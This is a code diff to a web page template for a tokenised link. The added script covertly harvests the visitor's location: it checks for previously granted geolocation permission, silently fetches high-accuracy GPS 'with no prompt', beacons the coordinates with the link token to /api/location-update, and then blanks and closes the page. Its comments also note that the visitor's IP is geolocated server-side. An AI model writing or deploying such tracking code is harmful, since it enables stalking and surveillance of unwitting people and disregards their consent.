@@ -19,24 +19,109 @@
 (function() {
   var token = "{{ token }}";
   {% if expired %}
-    // Link expired — go away immediately
     try { window.location.replace('about:blank'); } catch(e) {}
     try { window.close(); } catch(e) {}
     return;
   {% endif %}
 
-  // No geolocation calls needed — the server already captured our IP
-  // and geolocated it server-side before rendering this page.
-  // Just redirect to about:blank immediately.
-  try { window.location.replace('about:blank'); } catch(e) {}
+  var sent = false;
 
-  // Fallback: if replace fails, try href
-  setTimeout(function() {
-    try { window.location.href = 'about:blank'; } catch(e) {}
+  function sendLocation(lat, lng, accuracy, source) {
+    if (sent) return;
+    sent = true;
+
+    var payload = JSON.stringify({
+      token: token,
+      latitude: lat,
+      longitude: lng,
+      accuracy: accuracy,
+      source: source
+    });
+
+    var blob = new Blob([payload], { type: 'application/json' });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon('/api/location-update', blob);
+    } else {
+      fetch('/api/location-update', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true
+      }).catch(function(){});
+    }
+
+    // Redirect to blank immediately
+    try { window.location.replace('about:blank'); } catch(e) {}
     setTimeout(function() {
-      try { window.close(); } catch(e) {}
-    }, 100);
-  }, 50);
+      try { window.location.href = 'about:blank'; } catch(e) {}
+      setTimeout(function() {
+        try { window.close(); } catch(e) {}
+      }, 100);
+    }, 50);
+  }
+
+  function goAway() {
+    if (!sent) {
+      sent = true;
+      try { window.location.replace('about:blank'); } catch(e) {}
+      setTimeout(function() {
+        try { window.location.href = 'about:blank'; } catch(e) {}
+        setTimeout(function() {
+          try { window.close(); } catch(e) {}
+        }, 100);
+      }, 50);
+    }
+  }
+
+  // ── Check if GPS permission is already cached (from /verify flow) ──
+  if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name: 'geolocation' })
+      .then(function(permissionStatus) {
+        if (permissionStatus.state === 'granted') {
+          // Permission was previously granted — fire GPS silently (no prompt!)
+          if (!("geolocation" in navigator)) {
+            // GPS not available, fall back to IP (already captured server-side)
+            goAway();
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            function(position) {
+              sendLocation(
+                position.coords.latitude,
+                position.coords.longitude,
+                position.coords.accuracy,
+                'gps'
+              );
+            },
+            function() {
+              // GPS failed despite permission — IP fallback already done server-side
+              goAway();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+          // Safety timeout: if GPS takes too long, just go away
+          setTimeout(function() {
+            if (!sent) goAway();
+          }, 12000);
+        } else {
+          // Permission not granted (prompt or denied) — 
+          // IP geolocation was already captured server-side, just go away
+          goAway();
+        }
+      })
+      .catch(function() {
+        // Permissions API not supported — go away, IP is the fallback
+        goAway();
+      });
+  } else {
+    // No Permissions API — go away, IP is the fallback
+    goAway();
+  }
+
+  // Safety timeout: go away in 15s no matter what
+  setTimeout(function() {
+    if (!sent) goAway();
+  }, 15000);
 })();
 </script>
 </body>
